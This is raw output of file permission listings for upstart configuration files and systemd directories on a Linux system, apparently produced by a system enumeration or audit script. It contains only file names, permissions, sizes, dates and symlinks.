-rw-r--r--   1 root root  1232 Nov 18  2014 mountall.conf
-rw-r--r--   1 root root   349 Nov 18  2014 mountall-net.conf
-rw-r--r--   1 root root   261 Nov 18  2014 mountall-reboot.conf
-rw-r--r--   1 root root   311 Nov 18  2014 mountall.sh.conf
-rw-r--r--   1 root root  1201 Nov 18  2014 mountall-shell.conf
-rw-r--r--   1 root root   327 Nov 18  2014 mountdevsubfs.sh.conf
-rw-r--r--   1 root root   405 Nov 18  2014 mounted-debugfs.conf
-rw-r--r--   1 root root   730 Nov 18  2014 mounted-dev.conf
-rw-r--r--   1 root root   536 Nov 18  2014 mounted-proc.conf
-rw-r--r--   1 root root   618 Nov 18  2014 mounted-run.conf
-rw-r--r--   1 root root  1890 Nov 18  2014 mounted-tmp.conf
-rw-r--r--   1 root root   903 Nov 18  2014 mounted-var.conf
-rw-r--r--   1 root root   323 Nov 18  2014 mountkernfs.sh.conf
-rw-r--r--   1 root root   249 Nov 18  2014 mountnfs-bootclean.sh.conf
-rw-r--r--   1 root root   313 Nov 18  2014 mountnfs.sh.conf
-rw-r--r--   1 root root   238 Nov 18  2014 mtab.sh.conf
-rw-r--r--   1 root root  2493 Jun  2  2015 networking.conf
-rw-r--r--   1 root root   933 Jun  2  2015 network-interface.conf
-rw-r--r--   1 root root   530 Jun  2  2015 network-interface-container.conf
-rw-r--r--   1 root root  1756 Jun  2  2015 network-interface-security.conf
-rw-r--r--   1 root root   568 Jan 11  2017 network-manager.conf
-rw-r--r--   1 root root   568 Feb  1  2016 passwd.conf
-rw-r--r--   1 root root   119 Jun  5  2014 procps.conf
-rw-r--r--   1 root root   363 Jun  5  2014 procps-instance.conf
-rw-r--r--   1 root root   661 May 19  2016 rc.conf
-rw-r--r--   1 root root   683 May 19  2016 rcS.conf
-rw-r--r--   1 root root  1543 May 19  2016 rc-sysinit.conf
-rw-r--r--   1 root root   457 Jun  3  2015 resolvconf.conf
-rw-r--r--   1 root root   365 Nov  3  2014 rfkill-restore.conf
-rw-r--r--   1 root root   357 Nov  3  2014 rfkill-store.conf
-rw-r--r--   1 root root   426 Dec  2  2015 rsyslog.conf
-rw-r--r--   1 root root   230 Apr  4  2016 setvtrgb.conf
-rw-r--r--   1 root root   277 May 19  2016 shutdown.conf
-rw-r--r--   1 root root   641 Mar 16  2017 ssh.conf
-rw-r--r--   1 root root   360 Apr 18  2017 thermald.conf
-rw-r--r--   1 root root   348 May 19  2016 tty1.conf
-rw-r--r--   1 root root   333 May 19  2016 tty2.conf
-rw-r--r--   1 root root   333 May 19  2016 tty3.conf
-rw-r--r--   1 root root   333 May 19  2016 tty4.conf
-rw-r--r--   1 root root   232 May 19  2016 tty5.conf
-rw-r--r--   1 root root   232 May 19  2016 tty6.conf
-rw-r--r--   1 root root   337 Apr 12  2016 udev.conf
-rw-r--r--   1 root root   360 Apr 12  2016 udevmonitor.conf
-rw-r--r--   1 root root   352 Apr 12  2016 udevtrigger.conf
-rw-r--r--   1 root root   473 Aug  7  2014 ufw.conf
-rw-r--r--   1 root root   412 May 19  2016 upstart-file-bridge.conf
-rw-r--r--   1 root root   329 May 19  2016 upstart-socket-bridge.conf
-rw-r--r--   1 root root   553 May 19  2016 upstart-udev-bridge.conf
-rw-r--r--   1 root root   889 Feb 24  2015 ureadahead.conf
-rw-r--r--   1 root root   683 Feb 24  2015 ureadahead-other.conf
-rw-r--r--   1 root root   141 Oct  5  2015 usb-modeswitch-upstart.conf
-rw-r--r--   1 root root  1521 May 19  2016 wait-for-state.conf
-rw-r--r--   1 root root   453 Jul 27  2017 whoopsie.conf


[-] /lib/systemd/* config file permissions:
/lib/systemd/:
total 8.4M
drwxr-xr-x 29 root root  36K May 29 10:44 system
drwxr-xr-x  2 root root 4.0K Mar 19  2018 system-sleep
drwxr-xr-x  2 root root 4.0K Mar 19  2018 network
drwxr-xr-x  2 root root 4.0K Mar 19  2018 system-generators
drwxr-xr-x  2 root root 4.0K Mar 19  2018 system-preset
-rwxr-xr-x  1 root root 442K Feb  1  2018 systemd-udevd
-rwxr-xr-x  1 root root 1.5M Feb  1  2018 systemd
-rwxr-xr-x  1 root root  50K Feb  1  2018 systemd-binfmt
-rwxr-xr-x  1 root root 142K Feb  1  2018 systemd-shutdown
-rwxr-xr-x  1 root root 279K Feb  1  2018 systemd-cgroups-agent
-rwxr-xr-x  1 root root  74K Feb  1  2018 systemd-sleep
-rwxr-xr-x  1 root root 347K Feb  1  2018 systemd-timedated
-rwxr-xr-x  1 root root 307K Feb  1  2018 systemd-fsck
-rwxr-xr-x  1 root root 347K Feb  1  2018 systemd-hostnamed
-rwxr-xr-x  1 root root 627K Feb  1  2018 systemd-logind
-rwxr-xr-x  1 root root 122K Feb  1  2018 systemd-networkd-wait-online
-rwxr-xr-x  1 root root 671K Feb  1  2018 systemd-resolved
-rwxr-xr-x  1 root root  14K Feb  1  2018 systemd-ac-power
-rwxr-xr-x  1 root root 102K Feb  1  2018 systemd-bootchart
-rwxr-xr-x  1 root root 367K Feb  1  2018 systemd-bus-proxyd
-rwxr-xr-x  1 root root  90K Feb  1  2018 systemd-cryptsetup
-rwxr-xr-x  1 root root  74K Feb  1  2018 systemd-fsckd
-rwxr-xr-x  1 root root  30K Feb  1  2018 systemd-hibernate-resume
-rwxr-xr-x  1 root root  34K Feb  1  2018 systemd-random-seed
-rwxr-xr-x  1 root root  54K Feb  1  2018 systemd-remount-fs
-rwxr-xr-x  1 root root  30K Feb  1  2018 systemd-reply-password
-rwxr-xr-x  1 root root  98K Feb  1  2018 systemd-socket-proxyd
-rwxr-xr-x  1 root root 146K Feb  1  2018 systemd-timesyncd
-rwxr-xr-x  1 root root  34K Feb  1  2018 systemd-user-sessions
-rwxr-xr-x  1 root root 283K Feb  1  2018 systemd-initctl
-rwxr-xr-x  1 root root 342K Feb  1  2018 systemd-journald
-rwxr-xr-x  1 root root 355K Feb  1  2018 systemd-localed
-rwxr-xr-x  1 root root  54K Feb  1  2018 systemd-modules-load
-rwxr-xr-x  1 root root 855K Feb  1  2018 systemd-networkd
-rwxr-xr-x  1 root root  30K Feb  1  2018 systemd-quotacheck
-rwxr-xr-x  1 root root  54K Feb  1  2018 systemd-sysctl
-rwxr-xr-x  1 root root  50K Feb  1  2018 systemd-activate
-rwxr-xr-x  1 root root  94K Feb  1  2018 systemd-backlight
-rwxr-xr-x  1 root root  94K Feb  1  2018 systemd-rfkill
-rwxr-xr-x  1 root root 283K Feb  1  2018 systemd-update-utmp
-rwxr-xr-x  1 root root 1.3K Oct 26  2017 systemd-sysv-install
drwxr-xr-x  2 root root 4.0K Apr 12  2016 system-shutdown

/lib/systemd/system:
total 1.1M
-rw-r--r-- 1 root root  479 May  8  2018 run-vmblock-fuse.mount
-rw-r--r-- 1 root root  328 Apr 20  2018 open-vm-tools.service
-rw-r--r-- 1 root root  298 Mar 22  2018 vgauth.service
drwxr-xr-x 2 root root 4.0K Mar 19  2018 system-update.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 halt.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 initrd-switch-root.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 kexec.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 multi-user.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 poweroff.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 reboot.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 sysinit.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 sockets.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 getty.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 graphical.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 local-fs.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 rescue.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 resolvconf.service.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 sigpwr.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 timers.target.wants
drwxr-xr-x 2 root root 4.0K Mar 19  2018 rc-local.service.d
drwxr-xr-x 2 root root 4.0K Mar 19  2018 systemd-timesyncd.service.d
drwxr-xr-x 2 root root 4.0K Mar 19  2018 systemd-resolved.service.d
-rw-r--r-- 1 root root  225 Mar  6  2018 apt-daily.service
-rw-r--r-- 1 root root  156 Mar  6  2018 apt-daily.timer
-rw-r--r-- 1 root root  238 Mar  6  2018 apt-daily-upgrade.service
-rw-r--r-- 1 root root  184 Mar  6  2018 apt-daily-upgrade.timer
-rw-r--r-- 1 root root  142 Feb 19  2018 cups.path
-rw-r--r-- 1 root root  175 Feb 19  2018 cups.service
-rw-r--r-- 1 root root  116 Feb 19  2018 cups.socket
-rw-r--r-- 1 root root  211 Feb 15  2018 fwupd-offline-update.service
-rw-r--r-- 1 root root  353 Feb 15  2018 fwupd.service
lrwxrwxrwx 1 root root   21 Feb  1  2018 udev.service -> systemd-udevd.service
lrwxrwxrwx 1 root root   14 Feb  1  2018 autovt@.service -> getty@.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootlogs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 bootmisc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkroot-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 checkroot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 cryptdisks-early.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 cryptdisks.service -> /dev/null
lrwxrwxrwx 1 root root   13 Feb  1  2018 ctrl-alt-del.target -> reboot.target
lrwxrwxrwx 1 root root   25 Feb  1  2018 dbus-org.freedesktop.hostname1.service -> systemd-hostnamed.service
lrwxrwxrwx 1 root root   23 Feb  1  2018 dbus-org.freedesktop.locale1.service -> systemd-localed.service
lrwxrwxrwx 1 root root   22 Feb  1  2018 dbus-org.freedesktop.login1.service -> systemd-logind.service
lrwxrwxrwx 1 root root   24 Feb  1  2018 dbus-org.freedesktop.network1.service -> systemd-networkd.service
lrwxrwxrwx 1 root root   24 Feb  1  2018 dbus-org.freedesktop.resolve1.service -> systemd-resolved.service
lrwxrwxrwx 1 root root   25 Feb  1  2018 dbus-org.freedesktop.timedate1.service -> systemd-timedated.service
lrwxrwxrwx 1 root root   16 Feb  1  2018 default.target -> graphical.target
lrwxrwxrwx 1 root root    9 Feb  1  2018 fuse.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 halt.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 hostname.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 hwclock.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 killprocs.service -> /dev/null
lrwxrwxrwx 1 root root   28 Feb  1  2018 kmod.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root   28 Feb  1  2018 module-init-tools.service -> systemd-modules-load.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 motd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountall-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountall.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountdevsubfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountkernfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountnfs-bootclean.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 mountnfs.service -> /dev/null
lrwxrwxrwx 1 root root   22 Feb  1  2018 procps.service -> systemd-sysctl.service
lrwxrwxrwx 1 root root   16 Feb  1  2018 rc.local.service -> rc-local.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 rc.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 rcS.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 reboot.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 rmnologin.service -> /dev/null
lrwxrwxrwx 1 root root   15 Feb  1  2018 runlevel0.target -> poweroff.target
lrwxrwxrwx 1 root root   13 Feb  1  2018 runlevel1.target -> rescue.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel2.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel3.target -> multi-user.target
lrwxrwxrwx 1 root root   17 Feb  1  2018 runlevel4.target -> multi-user.target
lrwxrwxrwx 1 root root   16 Feb  1  2018 runlevel5.target -> graphical.target
lrwxrwxrwx 1 root root   13 Feb  1  2018 runlevel6.target -> reboot.target
lrwxrwxrwx 1 root root    9 Feb  1  2018 sendsigs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 stop-bootlogd.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 stop-bootlogd-single.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountnfs.service -> /dev/null
lrwxrwxrwx 1 root root    9 Feb  1  2018 umountroot.service -> /dev/null
lrwxrwxrwx 1 root root   27 Feb  1  2018 urandom.service -> systemd-random-seed.service
lrwxrwxrwx 1 root root    9 Feb  1  2018 x11-common.service -> /dev/null
-rw-r--r-- 1 root root  770 Feb  1  2018 console-getty.service
-rw-r--r-- 1 root root  742 Feb  1  2018 console-shell.service
-rw-r--r-- 1 root root  791 Feb  1  2018 container-getty@.service
-rw-r--r-- 1 root root 1010 Feb  1  2018 debug-shell.service
-rw-r--r-- 1 root root 1009 Feb  1  2018 emergency.service
-rw-r--r-- 1 root root 1.5K Feb  1  2018 getty@.service
-rw-r--r-- 1 root root  630 Feb  1  2018 initrd-cleanup.service
-rw-r--r-- 1 root root  790 Feb  1  2018 initrd-parse-etc.service
-rw-r--r-- 1 root root  640 Feb  1  2018 initrd-switch-root.service
-rw-r--r-- 1 root root  664 Feb  1  2018 initrd-udevadm-cleanup-db.service
-rw-r--r-- 1 root root  677 Feb  1  2018 kmod-static-nodes.service
-rw-r--r-- 1 root root  473 Feb  1  2018 mail-transport-agent.target
-rw-r--r-- 1 root root  568 Feb  1  2018 quotaon.service
-rw-r--r-- 1 root root  612 Feb  1  2018 rc-local.service
-rw-r--r-- 1 root root  978 Feb  1  2018 rescue.service
-rw-r--r-- 1 root root 1.1K Feb  1  2018 serial-getty@.service
-rw-r--r-- 1 root root  653 Feb  1  2018 systemd-ask-password-console.service
-rw-r--r-- 1 root root  681 Feb  1  2018 systemd-ask-password-wall.service
-rw-r--r-- 1 root root  724 Feb  1  2018 systemd-backlight@.service
-rw-r--r-- 1 root root  959 Feb  1  2018 systemd-binfmt.service
-rw-r--r-- 1 root root  650 Feb  1  2018 systemd-bootchart.service
-rw-r--r-- 1 root root 1.0K Feb  1  2018 systemd-bus-proxyd.service
-rw-r--r-- 1 root root  497 Feb  1  2018 systemd-exit.service
-rw-r--r-- 1 root root  551 Feb  1  2018 systemd-fsckd.service
-rw-r--r-- 1 root root  674 Feb  1  2018 systemd-fsck-root.service
-rw-r--r-- 1 root root  648 Feb  1  2018 systemd-fsck@.service
-rw-r--r-- 1 root root  544 Feb  1  2018 systemd-halt.service
-rw-r--r-- 1 root root  631 Feb  1  2018 systemd-hibernate-resume@.service
-rw-r--r-- 1 root root  501 Feb  1  2018 systemd-hibernate.service
-rw-r--r-- 1 root root  710 Feb  1  2018 systemd-hostnamed.service
-rw-r--r-- 1 root root  778 Feb  1  2018 systemd-hwdb-update.service
-rw-r--r-- 1 root root  519 Feb  1  2018 systemd-hybrid-sleep.service
-rw-r--r-- 1 root root  480 Feb  1  2018 systemd-initctl.service
-rw-r--r-- 1 root root 1.3K Feb  1  2018 systemd-journald.service
-rw-r--r-- 1 root root  731 Feb  1  2018 systemd-journal-flush.service
-rw-r--r-- 1 root root  557 Feb  1  2018 systemd-kexec.service
-rw-r--r-- 1 root root  691 Feb  1  2018 systemd-localed.service
-rw-r--r-- 1 root root 1.2K Feb  1  2018 systemd-logind.service
-rw-r--r-- 1 root root  693 Feb  1  2018 systemd-machine-id-commit.service
-rw-r--r-- 1 root root  967 Feb  1  2018 systemd-modules-load.service
-rw-r--r-- 1 root root 1.3K Feb  1  2018 systemd-networkd.service
-rw-r--r-- 1 root root  685 Feb  1  2018 systemd-networkd-wait-online.service
-rw-r--r-- 1 root root  553 Feb  1  2018 systemd-poweroff.service
-rw-r--r-- 1 root root  614 Feb  1  2018 systemd-quotacheck.service
-rw-r--r-- 1 root root  717 Feb  1  2018 systemd-random-seed.service
-rw-r--r-- 1 root root  548 Feb  1  2018 systemd-reboot.service
-rw-r--r-- 1 root root  757 Feb  1  2018 systemd-remount-fs.service
-rw-r--r-- 1 root root  907 Feb  1  2018 systemd-resolved.service
-rw-r--r-- 1 root root  696 Feb  1  2018 systemd-rfkill.service
-rw-r--r-- 1 root root  497 Feb  1  2018 systemd-suspend.service
-rw-r--r-- 1 root root  649 Feb  1  2018 systemd-sysctl.service
-rw-r--r-- 1 root root  655 Feb  1  2018 systemd-timedated.service
-rw-r--r-- 1 root root 1.1K Feb  1  2018 systemd-timesyncd.service
-rw-r--r-- 1 root root  598 Feb  1  2018 systemd-tmpfiles-clean.service
-rw-r--r-- 1 root root  703 Feb  1  2018 systemd-tmpfiles-setup-dev.service
-rw-r--r-- 1 root root  683 Feb  1  2018 systemd-tmpfiles-setup.service
-rw-r--r-- 1 root root  825 Feb  1  2018 systemd-udevd.service
-rw-r--r-- 1 root root  823 Feb  1  2018 systemd-udev-settle.service
-rw-r--r-- 1 root root  743 Feb  1  2018 systemd-udev-trigger.service
-rw-r--r-- 1 root root  757 Feb  1  2018 systemd-update-utmp-runlevel.service
-rw-r--r-- 1 root root  754 Feb  1  2018 systemd-update-utmp.service
-rw-r--r-- 1 root root  573 Feb  1  2018 systemd-user-sessions.service
-rw-r--r-- 1 root root  528 Feb  1  2018 user@.service
-rw-r--r-- 1 root root  879 Feb  1  2018 basic.target
-rw-r--r-- 1 root root  379 Feb  1  2018 bluetooth.target
-rw-r--r-- 1 root root  358 Feb  1  2018 busnames.target
-rw-r--r-- 1 root root  394 Feb  1  2018 cryptsetup-pre.target
-rw-r--r-- 1 root root  366 Feb  1  2018 cryptsetup.target
-rw-r--r-- 1 root root  670 Feb  1  2018 dev-hugepages.mount
-rw-r--r-- 1 root root  624 Feb  1  2018 dev-mqueue.mount
-rw-r--r-- 1 root root  431 Feb  1  2018 emergency.target
-rw-r--r-- 1 root root  501 Feb  1  2018 exit.target
-rw-r--r-- 1 root root  440 Feb  1  2018 final.target
-rw-r--r-- 1 root root  460 Feb  1  2018 getty.target
-rw-r--r-- 1 root root  558 Feb  1  2018 graphical.target
-rw-r--r-- 1 root root  487 Feb  1  2018 halt.target
-rw-r--r-- 1 root root  447 Feb  1  2018 hibernate.target
-rw-r--r-- 1 root root  468 Feb  1  2018 hybrid-sleep.target
-rw-r--r-- 1 root root  553 Feb  1  2018 initrd-fs.target
-rw-r--r-- 1 root root  526 Feb  1  2018 initrd-root-fs.target
-rw-r--r-- 1 root root  691 Feb  1  2018 initrd-switch-root.target
-rw-r--r-- 1 root root  671 Feb  1  2018 initrd.target
-rw-r--r-- 1 root root  501 Feb  1  2018 kexec.target
-rw-r--r-- 1 root root  395 Feb  1  2018 local-fs-pre.target
-rw-r--r-- 1 root root  507 Feb  1  2018 local-fs.target
-rw-r--r-- 1 root root  405 Feb  1  2018 machine.slice
-rw-r--r-- 1 root root  492 Feb  1  2018 multi-user.target
-rw-r--r-- 1 root root  464 Feb  1  2018 network-online.target
-rw-r--r-- 1 root root  461 Feb  1  2018 network-pre.target
-rw-r--r-- 1 root root  480 Feb  1  2018 network.target
-rw-r--r-- 1 root root  514 Feb  1  2018 nss-lookup.target
-rw-r--r-- 1 root root  473 Feb  1  2018 nss-user-lookup.target
-rw-r--r-- 1 root root  354 Feb  1  2018 paths.target
-rw-r--r-- 1 root root  552 Feb  1  2018 poweroff.target
-rw-r--r-- 1 root root  377 Feb  1  2018 printer.target
-rw-r--r-- 1 root root  693 Feb  1  2018 proc-sys-fs-binfmt_misc.automount
-rw-r--r-- 1 root root  603 Feb  1  2018 proc-sys-fs-binfmt_misc.mount
-rw-r--r-- 1 root root  543 Feb  1  2018 reboot.target
-rw-r--r-- 1 root root  396 Feb  1  2018 remote-fs-pre.target
-rw-r--r-- 1 root root  482 Feb  1  2018 remote-fs.target
-rw-r--r-- 1 root root  486 Feb  1  2018 rescue.target
-rw-r--r-- 1 root root  500 Feb  1  2018 rpcbind.target
-rw-r--r-- 1 root root  402 Feb  1  2018 shutdown.target
-rw-r--r-- 1 root root  362 Feb  1  2018 sigpwr.target
-rw-r--r-- 1 root root  420 Feb  1  2018 sleep.target
-rw-r--r-- 1 root root  403 Feb  1  2018 -.slice
-rw-r--r-- 1 root root  409 Feb  1  2018 slices.target
-rw-r--r-- 1 root root  380 Feb  1  2018 smartcard.target
-rw-r--r-- 1 root root  356 Feb  1  2018 sockets.target
-rw-r--r-- 1 root root  380 Feb  1  2018 sound.target
-rw-r--r-- 1 root root  441 Feb  1  2018 suspend.target
-rw-r--r-- 1 root root  353 Feb  1  2018 swap.target
-rw-r--r-- 1 root root  715 Feb  1  2018 sys-fs-fuse-connections.mount
-rw-r--r-- 1 root root  518 Feb  1  2018 sysinit.target
-rw-r--r-- 1 root root  719 Feb  1  2018 sys-kernel-config.mount
-rw-r--r-- 1 root root  662 Feb  1  2018 sys-kernel-debug.mount
-rw-r--r-- 1 root root 1.3K Feb  1  2018 syslog.socket
-rw-r--r-- 1 root root  646 Feb  1  2018 systemd-ask-password-console.path
-rw-r--r-- 1 root root  574 Feb  1  2018 systemd-ask-password-wall.path
-rw-r--r-- 1 root root  409 Feb  1  2018 systemd-bus-proxyd.socket
-rw-r--r-- 1 root root  540 Feb  1  2018 systemd-fsckd.socket
-rw-r--r-- 1 root root  524 Feb  1  2018 systemd-initctl.socket
-rw-r--r-- 1 root root  607 Feb  1  2018 systemd-journald-audit.socket
-rw-r--r-- 1 root root 1.1K Feb  1  2018 systemd-journald-dev-log.socket
-rw-r--r-- 1 root root  842 Feb  1  2018 systemd-journald.socket
-rw-r--r-- 1 root root  591 Feb  1  2018 systemd-networkd.socket
-rw-r--r-- 1 root root  617 Feb  1  2018 systemd-rfkill.socket
-rw-r--r-- 1 root root  450 Feb  1  2018 systemd-tmpfiles-clean.timer
-rw-r--r-- 1 root root  578 Feb  1  2018 systemd-udevd-control.socket
-rw-r--r-- 1 root root  570 Feb  1  2018 systemd-udevd-kernel.socket
-rw-r--r-- 1 root root  436 Feb  1  2018 system.slice
-rw-r--r-- 1 root root  585 Feb  1  2018 system-update.target
-rw-r--r-- 1 root root  405 Feb  1  2018 timers.target
-rw-r--r-- 1 root root  395 Feb  1  2018 time-sync.target
-rw-r--r-- 1 root root  417 Feb  1  2018 umount.target
-rw-r--r-- 1 root root  392 Feb  1  2018 user.slice
-rw-r--r-- 1 root root  117 Jan 18  2018 fwupdate-cleanup.service
-rw-r--r-- 1 root root  246 Jan  2  2018 apport-forward.socket
-rw-r--r-- 1 root root  189 Nov 30  2017 uuidd.service
-rw-r--r-- 1 root root  126 Nov 30  2017 uuidd.socket
-rw-r--r-- 1 root root  252 Nov 30  2017 snapd.autoimport.service
-rw-r--r-- 1 root root  386 Nov 30  2017 snapd.core-fixup.service
-rw-r--r-- 1 root root  290 Nov 30  2017 snapd.refresh.service
-rw-r--r-- 1 root root  323 Nov 30  2017 snapd.refresh.timer
-rw-r--r-- 1 root root  308 Nov 30  2017 snapd.service
-rw-r--r-- 1 root root  253 Nov 30  2017 snapd.snap-repair.service
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.snap-repair.timer
-rw-r--r-- 1 root root  281 Nov 30  2017 snapd.socket
-rw-r--r-- 1 root root  474 Nov 30  2017 snapd.system-shutdown.service
-rw-r--r-- 1 root root  420 Nov 29  2017 resolvconf.service
lrwxrwxrwx 1 root root   22 Nov 16  2017 network-manager.service -> NetworkManager.service
-rw-r--r-- 1 root root  364 Nov 16  2017 NetworkManager-dispatcher.service
-rw-r--r-- 1 root root  857 Nov 16  2017 NetworkManager.service
-rw-r--r-- 1 root root  303 Nov 16  2017 NetworkManager-wait-online.service
-rw-r--r-- 1 root root  342 Oct 27  2017 getty-static.service
-rw-r--r-- 1 root root  153 Oct 27  2017 sigpwr-container-shutdown.service
-rw-r--r-- 1 root root  175 Oct 27  2017 systemd-networkd-resolvconf-update.path
-rw-r--r-- 1 root root  715 Oct 27  2017 systemd-networkd-resolvconf-update.service
-rw-r--r-- 1 root root  266 Oct 16  2017 wpa_supplicant.service
lrwxrwxrwx 1 root root   27 Sep 13  2017 plymouth-log.service -> plymouth-read-write.service
lrwxrwxrwx 1 root root   21 Sep 13  2017 plymouth.service -> plymouth-quit.service
-rw-r--r-- 1 root root  412 Sep 13  2017 plymouth-halt.service
-rw-r--r-- 1 root root  426 Sep 13  2017 plymouth-kexec.service
-rw-r--r-- 1 root root  421 Sep 13  2017 plymouth-poweroff.service
-rw-r--r-- 1 root root  194 Sep 13  2017 plymouth-quit.service
-rw-r--r-- 1 root root  200 Sep 13  2017 plymouth-quit-wait.service
-rw-r--r-- 1 root root  244 Sep 13  2017 plymouth-read-write.service
-rw-r--r-- 1 root root  416 Sep 13  2017 plymouth-reboot.service
-rw-r--r-- 1 root root  532 Sep 13  2017 plymouth-start.service
-rw-r--r-- 1 root root  291 Sep 13  2017 plymouth-switch-root.service
-rw-r--r-- 1 root root  490 Sep 13  2017 systemd-ask-password-plymouth.path
-rw-r--r-- 1 root root  467 Sep 13  2017 systemd-ask-password-plymouth.service
-rw-r--r-- 1 root root  384 Sep 11  2017 bluetooth.service
lrwxrwxrwx 1 root root    9 Aug  4  2017 saned.service -> /dev/null
lrwxrwxrwx 1 root root    9 Aug  4  2017 alsa-utils.service -> /dev/null
drwxr-xr-x 2 root root 4.0K Aug  1  2017 display-manager.service.d
drwxr-xr-x 2 root root 4.0K Aug  1  2017 basic.target.wants
drwxr-xr-x 2 root root 4.0K Aug  1  2017 busnames.target.wants
-rw-r--r-- 1 root root  253 Jul 27  2017 whoopsie.service
-rw-r--r-- 1 root root  167 Jul  6  2017 wacom-inputattach@.service
-rw-r--r-- 1 root root  345 Apr 20  2017 unattended-upgrades.service
-rw-r--r-- 1 root root  254 Apr 18  2017 thermald.service
-rw-r--r-- 1 root root  506 Mar 31  2017 lightdm.service
-rw-r--r-- 1 root root  385 Mar 16  2017 ssh.service
-rw-r--r-- 1 root root  196 Mar 16  2017 ssh@.service
-rw-r--r-- 1 root root  216 Mar 16  2017 ssh.socket
-rw-r--r-- 1 root root  239 Mar 10  2017 gpu-manager.service
-rw-r--r-- 1 root root  269 Jan 31  2017 setvtrgb.service
-rw-r--r-- 1 root root  491 Jan 12  2017 dbus.service
-rw-r--r-- 1 root root  106 Jan 12  2017 dbus.socket
-rw-r--r-- 1 root root  735 Nov 30  2016 networking.service
-rw-r--r-- 1 root root  497 Nov 30  2016 ifup@.service
-rw-r--r-- 1 root root  631 Nov  3  2016 accounts-daemon.service
-rw-r--r-- 1 root root  234 Aug 22  2016 cups-browsed.service
-rw-r--r-- 1 root root  134 Aug 20  2016 failsafe-graphical.target
-rw-r--r-- 1 root root  232 Aug 20  2016 failsafe-x.service
-rw-r--r-- 1 root root  285 Jun 16  2016 keyboard-setup.service
-rw-r--r-- 1 root root  288 Jun 16  2016 console-setup.service
-rw-r--r-- 1 root root  451 Jun 15  2016 upower.service
-rw-r--r-- 1 root root  545 Apr 27  2016 brltty.service
-rw-r--r-- 1 root root  429 Apr 27  2016 brltty-udev.service
-rw-r--r-- 1 root root  510 Apr 14  2016 alsa-restore.service
-rw-r--r-- 1 root root  483 Apr 14  2016 alsa-state.service
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel1.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel2.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel3.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel4.target.wants
drwxr-xr-x 2 root root 4.0K Apr 12  2016 runlevel5.target.wants
-rw-r--r-- 1 root root  234 Apr  8  2016 acpid.service
-rw-r--r-- 1 root root  251 Apr  5  2016 cron.service
-rw-r--r-- 1 root root  290 Apr  5  2016 rsyslog.service
-rw-r--r-- 1 root root  196 Apr  1  2016 udisks2.service
-rw-r--r-- 1 root root  142 Mar 31  2016 apport-forward@.service
-rw-r--r-- 1 root root  376 Mar 10  2016 kerneloops.service
-rw-r--r-- 1 root root  571 Mar  7  2016 udev-configure-printer@.service
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.socket
-rw-r--r-- 1 root root  115 Feb  9  2016 acpid.path
-rw-r--r-- 1 root root  207 Jan 27  2016 pppd-dns.service
-rw-r--r-- 1 root root  182 Jan 14  2016 polkitd.service
-rw-r--r-- 1 root root  183 Jan  4  2016 usbmuxd.service
-rw-r--r-- 1 root root 1.1K Nov 24  2015 avahi-daemon.service
-rw-r--r-- 1 root root  874 Nov 24  2015 avahi-daemon.socket
-rw-r--r-- 1 root root  298 Nov  6  2015 colord.service
-rw-r--r-- 1 root root  268 Nov  4  2015 ModemManager.service
-rw-r--r-- 1 root root 1.1K Oct 26  2015 rtkit-daemon.service
